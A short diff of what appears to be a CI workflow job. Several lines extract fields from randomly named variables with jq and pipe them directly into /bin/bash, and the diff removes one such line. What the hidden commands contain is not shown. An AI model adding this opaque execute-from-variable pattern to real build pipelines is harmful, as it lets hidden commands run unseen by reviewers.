@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$xij3" | jq -r .j7314 | /bin/bash
           echo $ca06664 | jq -r .k814 | /bin/bash
           echo $ws431 | jq -r .fwn05 | /bin/bash
-          printf '%s' "$zscyr475" | jq -r .ysy334 | /bin/bash
           printf '%s' "$g04" | jq -r .dj79160 | /bin/bash
 
       - name: Save results
